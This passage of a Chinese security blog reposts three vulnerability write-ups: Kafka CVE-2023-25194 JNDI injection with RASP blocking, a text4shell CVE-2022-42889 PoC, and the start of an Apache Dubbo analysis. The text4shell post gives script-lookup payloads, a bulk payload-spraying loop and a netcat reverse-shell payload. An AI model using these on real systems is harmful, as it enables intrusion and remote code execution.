+<p>exp可参考：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml</a></p>
+<p>发起攻击请求：</p>
+<p>构造payload ,执行新建&#x2F;tmp&#x2F;test.txt文件</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/1.png" alt="image"></p>
+<p>验证漏洞存在，文件新建成功</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/2.png" alt="image"></p>
+<p>开启RASP后发起攻击：</p>
+<p>在业务优先模式下，RASP会出现JNDI注入的告警，拦截最终的命令执行</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/3.png" alt="image"></p>
+<p>堆栈信息为</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/4.png" alt="image"></p>
+<p>在防护模式下将直接在JNDI注入处被拦截</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/5.png" alt="image"></p>
+<p>堆栈信息为</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>开始</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Properties)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/7.png" alt="image"></p>
+<p>跟进到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Propertiesorg.apache.kafka.common.serialization.Serializer&lt;K&gt;,org.apache.kafka.common.serialization.Serializer&lt;V&gt;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/8.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.utils.Utils#propsToMap</span><br></pre></td></tr></table></figure>
+
+<p>对传入对象进行处理</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/9.png" alt="image"></p>
+<p>将map型的对象传入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Map&lt;java.lang.String,java.lang.Object&gt;org.apache.kafka.common.serialization.Serializer&lt;K&gt;org.apache.kafka.common.serialization.Serializer&lt;V&gt;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/10.png" alt="image"></p>
+<p>之后调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.ProducerConfig#appendSerializerToConfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/11.png" alt="image"></p>
+<p>将返回的newConfigs传入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.ProducerConfig#ProducerConfig(java.util.Map&lt;java.lang.String,java.lang.Object&gt;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/12.png" alt="image"></p>
+<p>将配置参数传入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(org.apache.kafka.clients.producer.ProducerConfig,org.apache.kafka.common.serialization.Serializer&lt;K&gt;org.apache.kafka.common.serialization.Serializer&lt;V&gt;org.apache.kafka.clients.producer.internals.ProducerMetadata,org.apache.kafka.clients.KafkaClientorg.apache.kafka.clients.producer.internals.ProducerInterceptors&lt;K,V&gt;org.apache.kafka.common.utils.Time)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/13.png" alt="image"></p>
+<p>赋值后调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#newSender</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/14.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/15.png" alt="image"></p>
+<p>调用到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.ClientUtils#createChannelBuilder</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/16.png" alt="image"></p>
+<p>赋值后调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.ChannelBuilders#clientChannelBuilder</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/17.png" alt="image"></p>
+<p>这里对值做了一个判断后调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.ChannelBuilders#create</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/18.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/19.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/20.png" alt="image"></p>
+<p>Create方法中得到map型的configs后进行switch，得到SaslChannelBuilder类型channelBuilder的对象，switch结束后调用了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.SaslChannelBuilder#configure</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/21.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/22.png" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.SaslChannelBuilder#configure</span><br></pre></td></tr></table></figure>
+
+<p>进入循环后到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.security.authenticator.LoginManager#acquireLoginManager</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/23.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/24.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/25.png" alt="image"></p>
+<p>判断值后到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.security.authenticator.LoginManager#LoginManager</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/26.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/27.png" alt="image"></p>
+<p>跟进到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.security.authenticator.AbstractLogin#login</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/28.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.security.auth.login.LoginContext#login</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/29.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.security.auth.login.LoginContext#invokePriv</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/30.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.security.auth.login.LoginContext#invoke</span><br></pre></td></tr></table></figure>
+
+<p>进行逻辑判断后调用initialize方法</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/31.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/32.png" alt="image"></p>
+<p>Initialize中得到userProvider</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/33.png" alt="image"></p>
+<p>user.provider.url通过jndi提供</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/34.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.security.auth.<span class="keyword">module</span>.JndiLoginModule#login</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/35.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.security.auth.<span class="keyword">module</span>.JndiLoginModule#attemptAuthentication</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/36.png" alt="image"></p>
+<p>通过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.InitialContext#lookup(java.lang.String)</span><br></pre></td></tr></table></figure>
+
+<p>执行userProvider的值</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/37.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/38.png" alt="image"></p>
+<p>由于RASP对javax.naming.InitialContext.lookup调用做了防护策略检测，所以会在此处拦截。</p>
+</blockquote>
+<h2><span id="reference">Reference</span></h2><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/luelueking/Java-CVE-Lists#cve-2023-25194">https://github.com/luelueking/Java-CVE-Lists#cve-2023-25194</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.snert.cn/index.php/2023/04/04/cve-2023-25194-kafka-jndi-injection-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://blog.snert.cn/index.php/2023/04/04/cve-2023-25194-kafka-jndi-injection-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
+</ul>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/23/CVE-2022-42889-Apache-Commons/">
+                text4shell CVE-2022-42889 poc
+            </a>
+        </h2>
+    
+    <time>
+        Jan 23, 2024
+    </time>
+    <section class="content">
+        <h1><span id="text4shell-cve-2022-42889-poc">text4shell CVE-2022-42889 poc</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.ddosi.org/cve-2022-42889/">雨苁</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>在 Apache Common Text 包 1.5 到 1.9 中发现了一个存在缺陷的代码执行版本。攻击者从 Apache Commons Text 中包含的过程中成功完成，插值可能被动态定义。服务器应用程序会受到影响(RCE) 和不受远程服务器的隐私接触的影响。</p>
+<p>Apache Commons Text 执行变量插值，允许动态评估和扩展属性。插值的标准格式是“${prefix:name}”，其中“prefix”用于定位执行插值的 org.apache.commons.text.lookup.StringLookup 的实例。从 1.5 版到 1.9 版，默认 Lookup 实例集包括可能导致任意代码执行或与远程服务器联系的插值器。这些查找是： – “script” – 使用 JVM 脚本执行引擎 (javax.script) 执行表达式 – “dns” – 解析 dns 记录 – “url” – 从 url 加载值，包括来自远程服务器 如果使用了不受信任的配置值，则在受影响的版本中使用插值默认值的应用程序可能容易受到远程代码执行或与远程服务器的无意接触的影响。</p>
+<p>建议用户升级到 Apache Commons Text 1.10.0，默认情况下禁用有问题的插值器。</p>
+</blockquote>
+<h2><span id="影响范围">影响范围</span></h2><blockquote>
+<ul>
+<li>如果您依赖于使用 1.10.0 之前的 commons-text 版本的软件，您可能仍然不会受到攻击：只有当该软件使用<code>StringSubstitutor</code>API 而没有正确清理任何不受信任的输入时，您才会受到影响。</li>
+<li>如果您自己的软件使用 commons-text，请仔细检查它是否使用<code>StringSubstitutor</code>API，而没有正确清理任何不受信任的输入。如果是这样，更新到 1.10.0 可能是一个快速的解决方法，但推荐的解决方案是同时正确验证和清理任何不受信任的输入。</li>
+</ul>
+<p>Apache Commons Text 是一个低级库，用于执行各种文本操作，例如转义、计算字符串差异以及用通过插值器查找的值替换文本中的占位符。使用字符串替换功能时，一些可用的插值器可以触发网络访问或代码执行。这是有意的，但这也意味着如果应用程序在传递给替换的字符串中包含用户输入而未对其进行适当清理，则攻击者将允许攻击者触发这些插值器。</p>
+<p>出于这个原因，Apache Commons Text 团队决定将配置更新为“默认情况下更安全”，从而减轻无法验证输入的影响，并且不会让攻击者访问这些插值器。但是，仍然建议用户谨慎对待不受信任的输入。</p>
+<p>我们目前不知道有任何应用程序将不受信任的输入传递给替代者，因此在 Apache Commons Text 1.10.0 之前可能会受到此问题的影响。</p>
+<p>此问题与<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/security.html">Log4Shell (CVE-2021-44228)</a>不同，因为在 Log4Shell 中，可以从日志消息正文中进行字符串插值，该正文通常包含不受信任的输入。在 Apache Common Text issue 中，相关方法明确用于执行字符串插值并明确记录在案，因此应用程序不太可能在没有适当验证的情况下无意中传递不受信任的输入。</p>
+</blockquote>
+<h2><span id="漏洞利用条件">漏洞利用条件</span></h2><blockquote>
+<p>为了利用这些漏洞，<strong>必须满足以下要求</strong>：</p>
+<ul>
+<li>运行 1.5 到 1.9 版本的 Apache Commons Text</li>
+<li>使用<a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html">StringSubstitutor</a>插值器</li>
+</ul>
+</blockquote>
+<h2><span id="cve-2022-42889-poc">CVE-2022-42889 poc</span></h2><blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.get.Runtime().exec(\<span class="string">&#x27;&#x27;</span>.trim($cmd).<span class="string">&#x27;\&#x27;)&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>用有效负载替换参数值：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="网址">网址</span></h3><blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;url:UTF-<span class="number">8</span>:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Burl%3AUTF-8%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="dns">Dns</span></h3><blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;dns:address:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Bdns%3Aaddress%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="批量">批量</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/kljunowsky/97479082f50cd9219e80258f698c4d26/raw/7e600767bc59483653a34f17bd426340f28bf086/text4shell-payloads.txt">有效载荷.txt</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;url:UTF-<span class="number">8</span>:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;dns:address:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload in $(cat payloads.txt|sed <span class="string">&#x27;s/ COLLABORATOR-HERE/SPACEid.burpcollaborator.com/g&#x27;</span>); <span class="keyword">do</span> echo TARGET.com | gau --blacklist ttf,woff,svg,png | qsreplace <span class="string">&quot;$payload&quot;</span> | sed <span class="string">&#x27;s/SPACE/%20/g&#x27;</span> | grep <span class="string">&quot;java.lang.Runtime.getRuntime&quot;</span> &gt;&gt; payloads-<span class="keyword">final</span>.txt;done &amp;&amp; ffuf -w payloads-<span class="keyword">final</span>.txt -u FUZZ</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="如何利用-cve-2022-42889">如何利用 CVE-2022-42889</span></h2><blockquote>
+<p>为了重现攻击，易受攻击的组件部署在 Docker 容器中，可从 EC2 实例访问，该实例将由攻击者控制。使用 netcat (nc) 命令，我们可以打开与易受攻击的应用程序的反向 shell 连接。</p>
+<p>易受攻击的 Web 应用程序公开了一个搜索 API，其中查询通过Commons Text 的<em>StringSubstitutor进行插值：</em></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.app/text4shell/attack?search=&lt;query&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以下有效载荷可用于利用该漏洞并打开反弹 shell：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nc 192.168.49.1 9090 -e /bin/sh&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此有效负载由“${prefix:name}”组成，它触发字符串查找。如上所述，“script”、“dns”和“url”是可以作为前缀来利用漏洞的键。</p>
+<p>在发送精心制作的请求之前，我们需要使用 netcat (nc) 命令设置反向 shell 连接以侦听端口 9090</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 9090</span><br></pre></td></tr></table></figure>
+
+<p>我们现在可以发送精心制作的请求，URL 对有效负载进行编码，如下所示。</p>
+<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/1.png" alt="image"></p>
+<p>我们可以看到攻击者成功打开了与易受攻击的应用程序的连接。</p>
+<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/2.png" alt="image"></p>
+<p>现在攻击者可以以 root 身份与易受攻击的机器交互并执行任意代码。</p>
+</blockquote>
+<h2><span id="cve-2022-42889-的影响">CVE-2022-42889 的影响</span></h2><blockquote>
+<p>根据<a target="_blank" rel="noopener" href="https://sysdig.com/blog/vulnerability-score-cvss-meaning/">CVSSv3 系统，它的</a><strong>CRITICAL 严重性</strong>得分为 9.8 。</p>
+<p>由于易于利用以及在机密性、完整性和可用性方面的巨大潜在影响，严重性至关重要。正如我们在上一节中通过精心设计的请求展示的那样，您可以完全控制易受攻击的系统。</p>
+<p>但是，<strong>这些漏洞不太可能与之前的 log4shell 和 spring4shell 产生相同的影响。</strong></p>
+<p>查看易受攻击的组件，利用的可能性与 Apache Commons Text 库的使用有关。具体来说，<strong>只有当它使用一些用户控制的输入实现 StringSubstitutor 对象时，才有可能利用它。这种在生产环境中的实现不像 Log4j 中易受攻击的字符串替换那样普遍</strong>。因此，Text4Shell 的大规模影响并不能真正与 Log4Shell 相提并论。</p>
+</blockquote>
+<h2><span id="检测和缓解-cve-2022-42889">检测和缓解 CVE-2022-42889</span></h2><blockquote>
+<p>如果您受到<strong>CVE-2022-42889</strong>的影响，您应该将应用程序<strong>Apache Commons Text 更新到版本1.10。</strong></p>
+</blockquote>
+<h3><span id="burpsuite插件之text4shell漏扫扫描器">burpsuite插件之Text4Shell漏扫扫描器</span></h3><h4><span id="项目地址">项目地址:</span></h4><blockquote>
+<p>GitHub:<br><a target="_blank" rel="noopener" href="https://github.com/silentsignal/burp-text4shell">https://github.com/silentsignal/burp-text4shell</a></p>
+<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/3.png" alt="image"></p>
+</blockquote>
+<h4><span id="插件下载地址">插件下载地址:</span></h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/silentsignal/burp-text4shell/releases/download/v0.1/burp-text4shell.jar">burp-text4shell.jar</a></p>
+</blockquote>
+<h4><span id="单问题扫描">单问题扫描</span></h4><blockquote>
+<p>关于检测功能的注意事项：此插件只会为内置的主动扫描器提供有效负载，因此为了获得最佳覆盖率与性能，您必须正确配置扫描 – 就像任何其他内置或扩展提供的扫描一样.</p>
+<p>如果您只想扫描 CVE-2022-42889（而不是 XSS 或 SQLi 等其他东西），这个插件可以实现。</p>
+<p>按照以下说明，如果使用作为结果创建的扫描配置，扫描仪将仅对所有插入点执行 Text4Shell 检查。</p>
+<ol>
+<li>创建新扫描时，单击<code>Select from library</code>选项<code>Scan configuration</code>卡</li>
+<li>选择<code>Audit checks - extensions only</code>Burp Suite Pro 2.x 中内置的</li>
+<li>禁用所有其他已注册活动扫描检查的扩展程序（如果适用）（例如 ActiveScan++、反斜杠驱动扫描、Burp Bounty 等），以便仅运行 Text4Shell 扫描程序</li>
+</ol>
+</blockquote>
+<h4><span id="建造">建造</span></h4><blockquote>
+<p> 执行<code>./gradlew build</code>，您将准备好插件 <code>build/libs/burp-text4shell.jar</code></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/23/CVE-2023-29234-Apache-Dubbo/">
+                Apache dubbo 部分历史漏洞以及 CVE-2023-29234 分析
+            </a>
+        </h2>
+    
+    <time>
+        Jan 23, 2024
+    </time>
+    <section class="content">
+        <h1><span id="apache-dubbo-部分历史漏洞以及-cve-2023-29234-分析">Apache dubbo 部分历史漏洞以及 CVE-2023-29234 分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13187?time__1311=mqmxnDBDcD2A0=KDsD7mj5a=iNe0K3Irx&alichlgref=https://xz.aliyun.com/t/13187#toc-3">RacerZ</a> 并作补充</p>
+</blockquote>
+<h2><span id="写在前面">写在前面</span></h2><blockquote>
+<p>最近学习并梳理了一下 Apache dubbo 的两个经典由于泛化调用处理存在问题的 CVE 漏洞，并分析了一下最新 CVE-2023-29234 ，总结出了两种利用方式。</p>
+</blockquote>
+<h2><span id="cve-2021-30179">CVE-2021-30179</span></h2><h3><span id="前置泛化调用">前置：泛化调用</span></h3><blockquote>
+<p>泛化调用（客户端泛化调用）是指在调用方没有服务方提供的 API（SDK）的情况下，对服务方进行调用，并且可以正常拿到调用结果。详细见 <a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/">https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/</a></p>
+</blockquote>
+<h3><span id="调试分析">调试分析</span></h3><blockquote>
+<p><code>org.apache.dubbo.remoting.transport.DecodeHandler#received</code> 作为客户端 RPC 调用请求信息处理的入口点，调用 <code>decode</code> 方法。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/1.png" alt="image"></p>
+<p>根据参数类型可知实际会调用到 <code>org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode()</code><br>其中会先调用 <code>CodecSupport.getSerialization</code> 方法，根据 id 选择相应的反序列化策略，默认会走 <code>org.apache.dubbo.common.serialize.hessian2.Hessian2Serialization#deserialize</code> ，最终返回一个 <code>Hessian2ObjectInput</code> 实例。接着这一部分会按照顺序依次解析序列化流，获取 dubbo 服务版本、服务类路径、子版本、服务方法名以及参数描述符。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/2.png" alt="image"></p>
+<p>之后会根据方法名和参数名在服务端查找是否存在对应的服务方法，如果为 null，则调用 <code>RpcUtils.isGenericCall</code> 判断是否为泛型引用。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/3.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/4.png" alt="image"></p>
+<p>如果是的话则调用 <code>ReflectUtils.desc2classArray</code> 方法显式加载 desc 当中的类。之后根据类型执行 readObject 反序列化参数值，并设置到 <code>RpcInvocation</code> 实例的各个字段当中。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/5.png" alt="image"></p>
+<p>这个地方之前也是存在反序列化攻击利用的（感兴趣的师傅可以翻一翻以前的 CVE 分析）。不过根据</p>
+<p><a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/06/01/CVE-2021-30179">https://threedr3am.github.io/2021/06/01/CVE-2021-30179</a> - Dubbo Pre-auth RCE via Java deserialization in the Generic filter&#x2F;<br>提到：“受限于默认hessian或者已配置的序列化类型，具有一定的局限性”。</p>
+<p>整体梳理一下这部分序列化&#x2F;反序列化参数顺序：</p>
+<ul>
+<li>string * 5 (dubboVersion &#x2F; path &#x2F; version &#x2F; methodName &#x2F; desc)</li>
+<li>object * args (参数值实例，具体数量根据方法描述符 desc 决定)</li>
+<li>map (这里面可用于设置 generic key)<br>之后会去执行 <code>org.apache.dubbo.remoting.exchange.support.header.HeaderExchangeHandler#received</code> ，这里关注到 <code>message</code> 参数类型当前为 Request 类，因此会走第一个分支（后续会关注到 Response 分支部分）。</li>
+</ul>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/6.png" alt="image"></p>
+<p>观察到刚才解析得到的各个参数值位于 <code>message</code> 的 <code>mData</code> 字段。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/7.png" alt="image"></p>
+<p>第一个分支当中会再次取出 <code>mData</code> 的字段值转化为 <code>RpcInvocation</code> 类实例，并调用 <code>org.apache.dubbo.remoting.exchange.support.ExchangeHandlerAdapter#received</code> 方法，进一步调用 <code>reply</code> 。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/8.png" alt="image"></p>
+<p>之后就会触发一系列 Filter 的 invoke 方法，调用栈如下：</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/9.png" alt="image"></p>
+<p>关键 filter 函数是 <code>org.apache.dubbo.rpc.filter.GenericFilter#invoke</code> ，再次判断是否为泛型引用之后，会根据 <code>inv</code> 中提供的方法名从 dubbo 服务中找到对应方法，并取出参数类型和具体的参数值。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/10.png" alt="image"></p>
+<p>中间会从 <code>inv</code> 的 <code>attachments</code> 中取出 key 为 <code>generic</code> 的值，这个 <code>generic</code> 代表不同的反序列化策略，除 raw.return 外还有 nativejava、bean、protobuf-json 等。</p>
+</blockquote>
